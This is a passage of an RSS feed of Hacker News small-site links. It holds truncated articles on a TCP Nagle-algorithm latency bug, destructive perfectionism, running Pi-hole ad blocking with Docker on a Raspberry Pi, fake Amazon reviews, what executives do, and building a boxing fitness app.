there’ll ever be a full packet of data, or generating more data might wait for
the other side to answer. We would never send anything and wait forever and the
Internet would not work.</p>

<p>Instead, the algorithm is willing to send <em>one</em> undersized packet and then it
waits for an <code>ACK</code> from the other side until sending another undersized one. If
it gets a packetfull of data to send in the meantime, that’s great and it sends
it (it won’t get better by waiting longer), but it won’t ever have two
undersized ones somewhere in flight, therefore won’t kill the network’s
performance by them.</p>

<p>This works, it’ll make progress eventually because once the <code>ACK</code> comes and
all the data that accumulated until then is sent.</p>

<p>But it also slows things down. Like in our case. What happens if we do it using
single syscall, the whole HTTP response forms a single undersized packet (we
have really small answers) and gets sent, no matter if it’s submitted to the
kernel by one big or two small buffers.</p>

<p>On the other hand, if we split the submission into two syscalls, this is what
happens:</p>

<ul>
  <li>We write the first part (headers). The kernel sends them out as an undersized
packet.</li>
  <li>We write the second part (the body). But the kernel shelves them into the send
buffer and waits for sending them until it sees the <code>ACK</code>, because there’s one
undersized packet …</li></ul></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vorner.github.io/2020/11/06/40-ms-bug.html">https://vorner.github.io/2020/11/06/40-ms-bug.html</a></em></p>]]>
            </description>
            <link>https://vorner.github.io/2020/11/06/40-ms-bug.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069734</guid>
            <pubDate>Thu, 12 Nov 2020 13:43:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to get over ‘never good enough’]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25069727">thread link</a>) | @CapitalistCartr
<br/>
November 12, 2020 | https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>â€˜If itâ€™s worth doing, itâ€™s worth doing well.â€™ How many times did I hear that growing up? My parents were attempting to teach me (just in case I hadnâ€™t absorbed it from their actions) the importance of striving for excellence. They were encouraging what some psychologists call â€˜constructive perfectionismâ€™ or â€˜healthy perfectionismâ€™ â€“ a personality trait thatâ€™s associated with finding enjoyment and even fulfilment in life from doing things as well as you possibly can. With constructive or â€˜positive perfectionismâ€™, the focus is process-oriented; you learn from mistakes or even failure. Itâ€™s generally considered a beneficial trait thatâ€™s linked with being more conscientious and self-disciplined.</p>
<p>Yet perfectionism can have a darker side. The American academic and author BrenÃ© Brown defined this kind of perfectionism in her first <a href="https://www.hazelden.org/HAZ_MEDIA/2545_GiftsofImperfection.pdf" rel="nofollow noreferrer noopener">book</a>, <em>The Gifts of Imperfection</em> (2010), as â€˜a self-destructive and addictive belief system that fuels this primary thought: if I look perfect, live perfectly, and do everything perfectly, I can avoid or minimise the painful feelings of shame, judgment and blame.â€™ This form of perfectionism, which is fuelled by inner shame that must be quelled, involves trying to constantly meet perceived expectations of what â€˜perfectâ€™ is. This perfectionism isnâ€™t fulfilling and itâ€™s far from enjoyable. Yet many people feel itâ€™s mandatory to look as if all <em>is</em> perfect. They believe that not to do so would imply imperfection.</p>
<p>This is whatâ€™s <a href="https://psycnet.apa.org/record/1996-14509-001" rel="nofollow noreferrer noopener">known</a> in the wider psychological literature as â€˜unhealthy perfectionismâ€™ or â€˜destructive perfectionismâ€™. In this case, the purpose has nothing to do with process. Itâ€™s goal-oriented. Itâ€™s driven. Itâ€™s pressured. And I believe itâ€™s increasingly contributing to mental health problems.</p>
<p>Constructive perfectionists, letâ€™s say if theyâ€™re swimmers, want to beat their personal best. That brings with it all kinds of positive vibes. Winning the race is great, if indeed they do.</p>
<p>But destructive perfectionists want to be the perfect swimmer. And winning <em>every</em> race is the goal; if not, shame says to them that they have little to no value or worth.</p>
<p>Many perfectionistic people will fall somewhere on a spectrum between the two poles. But in my clinical practice Iâ€™ve noticed another issue. Ironically, destructive perfectionists might not even recognise themselves as perfectionists, because they never believe their best is good enough. Thereâ€™s always the next achievement. And then the next. And the next.</p>
<p>So, what are the roots of destructive perfectionism? I believe people often develop this way of thinking and being when they grow up without a sense of support, safety and nurturing. It can also be a reaction to childhood trauma or extreme cultural expectations, where appearing perfect becomes a mandatory strategy to emotionally survive, and where vulnerability is disdained.</p>
<p>Over the past decade, Iâ€™ve treated more and more people who didnâ€™t quite know why theyâ€™d come to therapy. Theyâ€™d erected huge barriers against revealing any kind of emotional pain; I wondered if they even had the capability of expressing such feelings. Outwardly, they didnâ€™t seem depressed at all; the descriptions of their issues sounded more like the result of overwork, fatigue or mild anxiety.</p>
<p>My interpretation is that they were destructive perfectionists who were running out of steam, but not sure what, if anything, was wrong. Their emotional pain was expertly, and often unconsciously, hidden.</p>
<p>If I asked them if they were depressed, Iâ€™d hear a firm denial. â€˜I have too many blessings in my life.â€™ If I questioned whether or not their childhood provided safety and security, theyâ€™d laugh and deny or discount any kind of problem. Or sometimes theyâ€™d become very quiet and look out the window, as if they wished they were anywhere but my office.</p>
<p>Yet as they returned for more sessions, theyâ€™d slowly risk sharing one shame-filled secret after another. Their seemingly impenetrable cloak of silence would slowly slip off, only to reveal tremendous loneliness and despair.</p>
<p>And in many cases, as they let down their guard, I found they could also understand that what was â€˜wrongâ€™ or unhealthy might not fit the rubric of classic depression. But it was just as real. And just as damaging.</p>
<p>I began researching the popular literature about perfectionism, shame and fear of vulnerability. I found a wealth of <a href="https://www.guilford.com/books/Perfectionism/Hewitt-Flett-Mikail/9781462528721/authors" rel="nofollow noreferrer noopener">research</a> and writings about the importance of vulnerability and the cost of shame by the aforementioned Brown, the much earlier thoughts on â€˜covert depressionâ€™ by the author and family therapist Terrence Real, and the <a href="https://www.harpercollins.com/products/self-compassion-kristin-neff?variant=32205936885794" rel="nofollow noreferrer noopener">book</a> <em>Self-Compassion</em> (2015) by the psychologist Kristin Neff. But crucially I couldnâ€™t find anything for the general public about the relationship between perfectionism and a form of potentially serious depression.</p>
<p>So, drawing on the experiences and stories of the many clients Iâ€™ve seen in my practice over 25 years, I formulated my own ideas about this distinct problem and how it can be addressed most effectively and compassionately. My work â€“ laid out in my <a href="https://drmargaretrutherford.com/perfectlyhiddendepressionbook/" rel="nofollow noreferrer noopener">book</a> <em>Perfectly Hidden Depression</em> (2019) â€“ is based on how a dangerous kind of perfectionism-fuelled depression can affect someoneâ€™s life; how even if someone scores low on a standard depression inventory, they can be living with deep-seated emotional difficulties and unresolved traumatic experiences that might ultimately threaten their will to live. This is the syndrome I call â€˜perfectly hidden depressionâ€™.</p>
<p>Iâ€™ve identified 10 traits that manifest in the daily decision-making and behaviour of people who exhibit signs of this syndrome:</p><ul>
<li>You are highly perfectionistic, fuelled by a constant, critical inner voice of intense shame or fear.</li>
<li>You demonstrate a heightened or excessive sense of responsibility and look for solutions.</li>
<li>You have difficulty accepting and expressing painful emotions, remaining more analytical or â€˜in your headâ€™.</li>
<li>You discount, dismiss or deny abuse or trauma from the past, or the present.</li>
<li>You worry a great deal (but hide that habit) and avoid situations where youâ€™re not in control.</li>
<li>You are highly focused on tasks and othersâ€™ expectations, using accomplishment as a way to feel validated. Yet as the last accomplishment fades, new pressure assumes itself, and any success is discounted.</li>
<li>You have an active and sincere concern for the wellbeing of others, while allowing few (if any) into your inner world.</li>
<li>You hold a strong belief in â€˜counting your blessingsâ€™ and feel that any other stance reflects a lack of gratitude.</li>
<li>You have emotional difficulty with personal intimacy but demonstrate significant professional success.</li>
<li>You might have accompanying mental health issues that involve anxiety and control issues, such as obsessive-compulsive disorder (OCD), generalised anxiety disorder (GAD), panic and/or eating disorders.</li>
</ul><p>If you read these 10 traits and find that many or all of them match you, then hopefully this is in some sense reassuring â€“ it might give you an inkling of why you feel the way you do, how you havenâ€™t known what was wrong and have been ashamed to even consider it. If suddenly a light has come on â€“ you recognise that you canâ€™t bring yourself to share any vulnerability; or perhaps you recognise these traits in someone else, then first â€“ breathe. And know this: Iâ€™ve found there is an antidote to perfectly hidden depression â€“ self-acceptance.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>If you believe that you are an unhealthy perfectionist and that it could be masking your own deep-rooted emotional problems, I propose five stages that can help you: consciousness, commitment, confrontation, connection and change.</p>
<p><strong>The first stage: consciousness</strong></p>
<p>This stage refers to the importance of becoming aware that your perfectionism is a problem in the first place. Although recognising oneâ€™s problems is a part of every emotional/mental healing process, this stage might be especially complicated for you because youâ€™ve convinced yourself that your perfectionist traits are normal or not a problem. â€˜Isnâ€™t everyone like this?â€™ you might wonder. The answer to that is a resounding â€˜noâ€™. Yet giving up or tweaking a strategy thatâ€™s brought you external success is likely to be very difficult. In fact, the process of avoiding any painful feelings and memories might have become something you do unconsciously.</p>
<p>There are various ways to develop more insight into the role that destructive perfectionism is playing in your life, but one exercise that you can try on your own is mindfulness. Mindfulness authors teach that itâ€™s not a process where you have to ensure youâ€™re always focusing intently on something. Mindfulness is more about changing <em>how</em> youâ€™re paying attention. Mindfulness deepens your experience of the present.</p>
<p>Hereâ€™s one simple mindfulness technique: sit somewhere comfortable and set a timer for three to five minutes. Breathe deeply and close your eyes. Stay as focused on your breaths as possible, even counting them from one to 10, and then starting over. If your mind wanders (which it will), gently let go of those thoughts and refocus on the breath. When the timer goes off, check in with your emotions, your eyes still closed. There could be irritation, relief, feeling silly. Simply notice and watch them dissipate.</p>
<p>Becoming conscious takes patience. The more you practise mindfulness, youâ€™ll begin to notice more about <em>how</em> youâ€™re interacting with both your external and internal worlds, including developing greater insight into how needing to seem perfect has seeped into almost all aspects of your life.</p>
<p><strong>The second stage: commitment</strong></p>
<p>As you become more aware of the problems perfectionism is causing you, you might still find that changing is hard. Ironically (and destructively) this can morph into another goal for you to reach perfectly. Iâ€™ve found that there are five major stumbling blocks to challenging perfectionismâ€™s grasp on your …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide">https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069727</guid>
            <pubDate>Thu, 12 Nov 2020 13:42:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remove ads from your life using Raspberry Pi, Docker and Docker Compose]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25069717">thread link</a>) | @karakanb
<br/>
November 12, 2020 | https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/ | <a href="https://web.archive.org/web/*/https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<header>
<time datetime="2020-10-12T00:00:00+00:00">October 12, 2020</time>
</header>
<p>I need to start this article with some simple disclaimers: I love Raspberry Pi, I love Docker, I don’t love networking that much (spoiler alert: I suck at it).</p>
<ul>
<li>I love Raspberry Pi because it is a tiny, fully functioning computer that gives me goosebumps. It is one of those things that makes you feel like <a href="https://en.wikipedia.org/wiki/Mr._Robot">Mr. Robot</a>. It is relatively cheap, it is accessible, and there are tons of guides online to do pretty much anything you can imagine.</li>
<li>I love Docker because it is a simple way of running various pieces of software in a standardized way: you pull the Docker image for your platform, you run the image with a single command and that’s it! You can glue things together, you can add your own images, you can share your configuration, you can run the same setup on different machines, and you can destroy things easily once you don’t need them anymore. I am not saying it is the simplest software ever, but it is relatively easy to play around with.</li>
<li>I don’t love networking much, simply because I suck at it. I have a basic understanding of high-level concepts about many parts of it, but they don’t always translate to how things work in real life. I roughly know how computers communicate over a network, but I quickly get lost when I need to debug a bad connection for example. The good thing is that it means I’ll aim to keep this guide as simple as possible so that I can understand it as well.</li>
</ul>
<p>So, since we are done with the disclaimers, let’s touch on the basics a bit before we get on with the guide. If you know all the tools and technologies mentioned above, feel free to skip that part.</p>

<p>Since we’ll need to get a bit technical in the article, there are a couple of things we need to clarify so that there will be less confusion moving forward. I’ll try to be brief here, and add some reading material in case you’d like to learn more.</p>
<h2 id="what-is-raspberry-pi">What is Raspberry Pi?</h2>
<p>Raspberry Pi is a simple, single-board computer that is originally developed for educational purposes; however, the board has become widely popular among makers and has been very popular for many use-cases including robotics, home automation, and IoT. The first one being launched in February 2012, the Raspberry Pi has 4 generations as of today, the latest one being the most advanced one including a Quad-core ARM processor and up to 8GB RAM. The latest version of it starts from $35 and goes up to $75; not super cheap, but a good price for a general-purpose computer.</p>
<p>Think of Raspberry Pi as a simple desktop computer without any screens or peripherals attached. You can connect screens to it, you can connect your keyboard, mouse, ethernet, and use it as a regular computer. There are tons of use-cases that don’t need these peripheral devices, therefore it is common to see Raspberry Pi devices being used inside handheld devices, or hidden in an office space as a network device, or whatever. It is a general-purpose computer, and your imagination is the limit here.</p>
<p>The device looks like this:</p>
<p><img src="https://burakkarakan.com/blog/assets/images/pihole-docker/raspberry-pi.png" alt="Raspberry Pi 4, [from the official Raspberry Pi website](https://www.raspberrypi.org/products/raspberry-pi-4-model-b/)"></p>

<p>They also have an even-cheaper and smaller version of the same family, Raspberry Pi Zero W, which has fewer resources than the regular Pi, but it is even smaller than the regular ones, making it suitable for IoT applications and mobile use-cases. The current selling price for the Zero W is <a href="https://www.raspberrypi.org/products/raspberry-pi-zero-w/">$10</a>.</p>
<p><img src="https://burakkarakan.com/blog/assets/images/pihole-docker/raspberry-pi-zero.jpg" alt="Raspberry Pi Zero, [from raspberrypi-spy.co.uk](https://www.raspberrypi-spy.co.uk/2015/11/introducing-the-raspberry-pi-zero/)"></p>

<p>All the Raspberry Pi devices are capable of running various operating systems (OS) depending on the specific model you have; however, the most common operating system for Raspberry Pi is <a href="https://www.raspberrypi.org/downloads/raspberry-pi-os/">Raspberry Pi OS</a>, Raspbian with its old name. It is based on Debian, has a bunch of simple installers, and it is a good starting point for tinkering with the Pi. I strongly recommend going with the Pi OS if you are just getting started with the ecosystem, it’ll definitely simplify your journey in the beginning in terms of finding documentation and help online.</p>
<p>For learning more about the Raspberry Pi, head over to the official <a href="https://www.raspberrypi.org/">Raspberry Pi website</a>.</p>
<h2 id="what-is-pi-hole">What is Pi-hole?</h2>
<p><a href="https://pi-hole.net/">Pi-hole</a> is a plug-and-play software that offers network-wide <a href="https://en.wikipedia.org/wiki/DNS_sinkhole">DNS sinkhole</a> for filtering out content for all the devices connected to the same network. In simple terms: when your browser tries to connect a server to show you some content on a website, Pi-hole will resolve the IP address for that host into a blackhole IP address if it is on a blocklist, meaning that your computer will not reach the ad server, and as a result, you won’t see ads. This has a bunch of benefits for the end-user:</p>
<ul>
<li>There is no need to install specific software to any of the devices connected to the network, and all of your devices can benefit from this, including your smart TV and mobile devices.</li>
<li>This allows blocking not only the traditional ads on websites but also the in-app ads that are embedded in other places, such as the operating system of your smart TV.</li>
<li>Since the request for the ad content will never leave your network, nothing will be downloaded, and your network performance will improve.</li>
<li>It also blocks some trackers, which means it automatically provides better privacy while you are surfing.</li>
</ul>
<p>All in all, Pi-hole is a neat piece of open-source software that gives you better visibility and control into the ad traffic that is happening in your network. For more details, go ahead and visit their <a href="https://pi-hole.net/">website</a>, as well as their <a href="https://github.com/pi-hole">GitHub organization</a> for checking the source code and learning more about the project.</p>
<h2 id="what-is-docker">What is Docker?</h2>
<p>The poster-child for the cloud-native era, Docker has been a very popular software in the last couple of years. It is essentially a nicely packaged system that simplifies managing containers on many different operating systems, and it is the de-facto standard engine for running containers. It allows you to package your application and its dependencies in a simple format and share them. You can head over to the following link to learn more about Docker (spoiler alert: I wrote the article):
<a href="https://medium.com/swlh/what-exactly-is-docker-1dd62e1fde38"><strong>What Exactly is Docker?</strong></a></p>

<p>So, I wanted to set up Pi-hole on my home network, and I had a <a href="https://www.raspberrypi.org/products/raspberry-pi-3-model-b-plus/?resellerType=home">Raspberry Pi 3 Model B+</a> lying around. I had a couple of goals before I started the setup:</p>
<ul>
<li>I wanted to be able to manage the device remotely; meaning that all I need to change things there should be a working network connection to the device, and since I’ll start with my home network, that’ll be a given anyway. I don’t want to depend on keyboards, screens, or other peripherals to be able to play with it.</li>
<li>I wanted to utilize the same Pi for my other use-cases such as home automation; therefore, I wanted to keep the Pi installation as clean as possible, in case I’d need to rebuild the same setup using a different device, or if I need to do a clean install on another storage device.</li>
<li>I wanted to be able to keep my setup in a Git repo in order to be able to keep track of my changes and have a backup, because, why not?</li>
<li>I wanted the setup to be easy to reproduce in other devices and networks so that I can set it up for my family and friends as well.</li>
<li>I wanted to be able to extend my setup with other use-cases, hopefully with some sort of automation to deploy my changes to the Pi. I can always connect to the Pi and install whatever I need manually, but this would contradict my previous goal to make the setup easy to reproduce.</li>
</ul>
<p>For some of you, these goals might be irrelevant, and that’s totally fine. I just wanted to aim for these and learn to try to achieve them.</p>
<p>In the end, I decided to go for a simple Pi OS Lite setup with Docker &amp; Docker Compose to manage Pi. The reason I picked the Lite OS is that I didn’t need a desktop environment and the other software that comes with the default Raspberry Pi OS, such as games or office software. The reason I decided on Docker is that I wanted to be able to run everything as containers on the device to not to depend on manual installation and the dependency hell, and Docker Compose is to be able to define all the things I’ll run in a simple YAML format that I can keep in the version control. In addition, relying on Docker from the beginning enables me for future adventures in case I want to go there, such as <a href="https://magpi.raspberrypi.org/articles/build-a-raspberry-pi-cluster-computer">building clusters</a> or <a href="https://ubuntu.com/tutorials/how-to-kubernetes-cluster-on-raspberry-pi#1-overview">running Kubernetes on Raspberry Pis.</a> Of course, these are not requirements, just potential ideas for my amusement.</p>
<p>As I have mentioned before, this doesn’t mean that you have to run this very same setup for your installation; it just happened to be the one I chose. The rest of the article will be about getting this configuration up and running, so, follow along if you are still interested.</p>

<p>Our requirements for the project is relatively simple:</p>
<ul>
<li>A primary computer to manage the whole installation in your network.</li>
<li>A working internet connection.</li>
<li>A router with ethernet ports. You can also use the built-in Wi-Fi some models have, although it will perform better if you use a cable connection.</li>
<li>A Raspberry Pi, I’d imagine any model would do the job here.</li>
<li>A MicroSD card for installing the operating system. If you already have an installed one, that’s also fine, it shouldn’t matter much which OS you have.</li>
</ul>
<p>The rest of the article will assume that you meet these requirements on your part.</p>
<p>The steps we’ll take are:</p>
<ul>
<li>Setup the SD-card for booting the device</li>
<li>Connect the Pi to your router, and access the internet</li>
<li>Install Docker</li>
<li>Run Pi-hole using Docker &amp; Docker Compose</li>
<li>Replace your router’s DHCP server with the Pi-hole DHCP server</li>
<li>That’s it!</li>
</ul>
<p>Let’s get started.</p>
<h2 id="before-you-go-on">Before you go on</h2>
<p>One thing to keep in mind is: Pi-hole cannot remove all the ads from all the websites. Blocking ads is simply a cat-mouse game, and Pi-hole is trying to disable them on the DNS level, meaning that you should still keep your blocker extensions on your browser for a good experience. Pi-hole will definitely contribute to your overall experience but do not get pissed off if it doesn’t remove all the ads, some ads are practically impossible to get rid of without significant effort.</p>
<p>If you are looking for a blocker extension, I recommend the open-source <a href="https://github.com/gorhill/uBlock">uBlock Origin</a>: here’s for <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en">Google Chrome</a> and here’s for <a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/">Mozilla Firefox</a>.</p>

<p>You can skip this section if you already have a …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/">https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/</a></em></p>]]>
            </description>
            <link>https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069717</guid>
            <pubDate>Thu, 12 Nov 2020 13:41:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can You Trust Amazon Reviews?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25069477">thread link</a>) | @TimLeland
<br/>
November 12, 2020 | https://timleland.com/can-you-trust-amazon-reviews/ | <a href="https://web.archive.org/web/*/https://timleland.com/can-you-trust-amazon-reviews/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-11141">
<img width="750" height="410" src="https://i0.wp.com/timleland.com/wp-content/uploads/2020/11/Can-You-Trust-Amazon-Reviews.png?resize=750%2C410&amp;ssl=1" alt="" loading="lazy"> <div>

<div>
<p>When you are considering buying a product on Amazon, how much do the reviews matter to you? Most people see lots of 5 stars and assume that the product must be great! Unfortunately, this may not be the best solution for validating Amazon reviews. Often people are sent free products for positive reviews or they are given refunds if they leave 5-star reviews. If I am ever suspicious of a product, I will use <a href="https://reviewmeta.com/" target="_blank" rel="noopener noreferrer">ReviewMeta</a> to check how valid the reviews are.</p>
<p>Review Meta allows you to paste in a link from Amazon to verify if the reviews are valid. I recently purchased a <a href="https://amzn.to/3la6xqn">headlamp</a> from Amazon that had almost 3,000 5 star reviews. I received the <a href="https://amzn.to/3la6xqn">headlamp</a> and it came with a card that if I left a 5-star review, I would receive a $15 Amazon gift card. To see if this was legit, I left a 5-star review and followed the instructions to email proof of the review. To my surprise, I received a $15 Amazon gift card for an $18 <a href="https://amzn.to/3la6xqn">flashlight</a>. When checking the flashlight on Review Meta the adjusted rating was 214 Reviews with 69% potentially unnatural reviews.<span id="more-11141"></span></p>
<p>Review Meta also offers <a href="https://reviewmeta.com/blog/extensions/" target="_blank" rel="noopener noreferrer">browser extensions</a> for those who want to quickly check reviews. Next time you plan to purchase something on Amazon, make sure you check if the reviews are valid.</p>
<p><span><iframe width="648" height="365" src="https://www.youtube.com/embed/ypZAsUh2M8M?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>


 </div>

</div>
</article></div>]]>
            </description>
            <link>https://timleland.com/can-you-trust-amazon-reviews/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069477</guid>
            <pubDate>Thu, 12 Nov 2020 13:16:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Executives Do]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069263">thread link</a>) | @swyx
<br/>
November 12, 2020 | https://boz.com/articles/executive | <a href="https://web.archive.org/web/*/https://boz.com/articles/executive">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>I recently held a question and answer session with a particularly talented
group of my colleagues who are taking on a challenging task. At the end they
thanked me for making the time to speak with them, as is often done. It always
strikes me as bizarre when people thank me for taking an hour of my time when
they are doing the real work.</p>
<p>I have come to realize that very few people have any idea what I do all day,
though most generously assume I must be very busy with big important things.
I often joke that I don’t do any real work, but that isn’t entirely fair.
What I mean is that the work I do is entirely indirect. I write neither code
nor copy, design neither atoms nor bits, sell neither hardware nor software.
None of my actions directly creates value or prevents harm. I thought it might
be interesting to walk through what I think my job is as “an executive.”</p>
<p>Job #1: <strong>Convince smart people to work with me</strong>. As I do very little direct
work it is important I hire people who are more able than I to direct said
work. It is only a slight exaggeration to say that nearly everything I do
affects my ability to hire the best people. Every private conversation accrues
in some part to my public reputation which reaches would be colleagues long
before I do. The more I am able to adapt to a wide range of working styles the
more people I become compatible with. Every public success or failure makes
people more or less open to the idea of collaborating. Even aspects of my
personal life play a role in whether people see me as a viable person to
entrust with their career. Did you ever wonder why I started writing so many
mildly self-important notes on the internet?</p>
<p>Job #2: <strong>Allocate scarce resources</strong>. Whether it is a question of money,
people, visibility, or just attention it is up to me to keep our portfolio in
balance.  The expression people see of this most often is decisions to fund or
not fund specific work but that’s only the manifestation of this work.  The
underlying work is deciding how much risk to indulge, how to allocate across
different timelines, and how to balance across the urgent and the important.</p>
<p>Job #3: <strong>Craft vision</strong>. Creating cohesion at any meaningful scale requires a
narrative in which each person can see how their work fits in and why the work
of their peers is important. My role affords me a unique point of view across
the breadth of the work and the ability to command enough attention to create
a <a href="https://boz.com/articles/mutual-knowledge">shared understanding</a> of how it
fits together.</p>
<p>Job #4: <strong>Break ties</strong>. I make far fewer decisions than most people expect.
And I consider most of those instances a failure to provide sufficient clarity
in advance. But sometimes we run into situations that demand trade-offs
between competing priorities that we hadn’t previously imagined. In those
cases the decisions come to me and after gathering context and unblocking
teams we work to provide new standing context so future decisions can be
resolved locally much more quickly.</p>
<p>Job #5: <strong>Curate Culture</strong>. My friend and former colleague Jocelyn Goldfein
wrote “<a href="https://jocelyngoldfein.com/culture-is-the-behavior-you-reward-and-punish-7e8e75c6543e">culture is the behavior you reward and
punish</a>.”
As the person in the organization with the broadest visibility and the biggest
platform that makes me uniquely suited to shape culture by choosing what to
bring positive and negative attention to.</p>
<p>Job #6: <strong>Advocate, explain, and be held accountable</strong>. This is the smallest
part of my job but by virtue of being more visible is often what people think
is the most important. Our products must speak for themselves and our
consumers will always be the loudest voice controlling their adoption. But we
do our best around the edges to communicate both externally and internally to
help people understand our work. And at the end of the day our own leadership
and the public will rightly lay responsibility for any failures at my feet.</p>
<p>Of this list only #2 and #4 are really exclusively my domain, the rest are
responsibilities I carry jointly with the team itself. The reason I keep
putting “executive” in quotes is that it isn’t a real job. In fact I don’t
think I’ve seen the title used outside of the media; and then it is usually to
build someone up to make a story more impressive. In reality I am just a
people manager. And of course like any great manager when I’m doing my job
well, I have to do very little of anything. It truly is a shame, then, that I
really am always so busy…</p></section></div></div>]]>
            </description>
            <link>https://boz.com/articles/executive</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069263</guid>
            <pubDate>Thu, 12 Nov 2020 12:51:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building, Releasing and Marketing an iOS Fitness App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069237">thread link</a>) | @marcgg
<br/>
November 12, 2020 | https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/ | <a href="https://web.archive.org/web/*/https://marcgg.com/blog/2020/11/12/building-boxing-mobile-app-swiftui/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container"> <div id="content"> <div id="post-"> <p>I practice boxing as a hobby, so when the first lockdown in France happened I decided to keep training at home. However I quickly found out that it was tough to stay focused on my own. I tried various solutions, like boxing along Youtube videos, but it got repetitive and a lot of videos didn’t fit the way I wanted to work out… I tried fitness apps, but they were focused on <a href="https://en.wikipedia.org/wiki/Calisthenics">calisthenics</a>, not boxing.</p> <p>It’s at that point I decided to build a small algorithm to create some kind of training plan and help me focus when training. It would be a fun side project helping me stay motivated to train alone. After some work this idea turned into a mobile app and finally into a <a href="https://shadowboxingapp.com/">product shipped to the App Store</a>!</p> <p>In this article I’ll try to talk about pretty much every aspect of the app development process, including SwiftUI, marketing, design, keyword optimizations, search ads, SEO and more. I think it can be interesting for anyone curious about building a product from nothing. I’d also say that if you are a solo developer wanting to get into the app space, this article can be a good read to help kickstart your project and gather some ideas.</p> <p>Some random stats at the time of writing this article:</p> <ul> <li>I <strong>started learning Swift 6 months ago</strong></li> <li>The app has been officially live for 3 months**, and I started actively promoting it 2 months ago</li> <li>The app was <strong>featured on the app store in 8 countries</strong></li> <li>The app has <strong>a few thousands monthly active users</strong>, of which <strong>~5% are paying customers</strong></li> <li>The algorithm features <strong>12 distinct exercises &amp; 25 workouts</strong></li> </ul> <p><img src="https://marcgg.com/assets/blog/swift/screenshot_practice_rotated.png" alt="Shadow boxing training app"></p> <h2 id="building-the-boxing-app-mvp">Building the Boxing App MVP</h2> <p>I’m a big fan of <a href="https://pragdave.me/blog/2014/03/04/time-to-kill-agile.html">working with agility</a>, so I wanted to build in increments starting with a <a href="https://en.wikipedia.org/wiki/Minimum_viable_product">minimum viable product</a> to gather feedback as soon as possible. Once this was done, the plan was to add to it depending on what I learned along the way.</p> <h3 id="initial-requirements">Initial Requirements</h3> <h4 id="the-algorithm">The Algorithm</h4> <p>In boxing a lot of people talk about punches using a numerical code. For instance 1 is a jab, 2 is a cross, 3 is a left hook and so on. This allows boxers to codify combinations of techniques. You must have heard “1-2” before for a jab-cross, but you could also do something more complex.</p> <p>To start I built a combo generation logic. Some techniques flow perfectly with each other, and some others just do not work together at all. For instance:</p> <ul> <li>1-2-3 (jab, cross, left hook) feels right, is easy to do and flows really well.</li> <li>1-1-1-1-1 (five jabs) is hard on the lead hand and shoulders and not very realistic.</li> <li>1-3 (jab, left hook) is a bit awkward but is an interesting mixup.</li> <li>5-5-5-5 (four left uppercut) makes very little sense.</li> </ul> <p>Then on top of this I can add variations, like throwing punches to the body or incorporating defensive movements. Finally I added vocal advices ranging from cheering you (“keep going!”) on to giving you generic advices (“lower your chin”).</p> <p>With this, I built different ways of giving combos to execute:</p> <ul> <li>Focus on one combo for a round, progressively adding to it. For instance start with 1-2, then after a bit build on it with a 1-2-3-2 and so on.</li> <li>Mimic <a href="https://shadowboxingapp.com/pad-work-boxing-reflexes/">pad work</a>, meaning that the app will call out a technique to execute on the spot.</li> </ul> <p>Finally I combined all of this into a coherent sequence of events, adding elements of randomness so that every single workout felt different.</p> <h4 id="mobile-app">Mobile App</h4> <p>I quickly figured that building an algorithm alone and print out exercises would not be enough, and that it needed at the very least some kind of UI. Building on mobile was what made the most sense since I would not be training in front of my computer. Here’s what I identified as must-haves at that point:</p> <ul> <li>A basic UI to set the various parameters of the algorithm</li> <li>A simple display with large fonts and clear colors to see the round timer &amp; punches to throw</li> 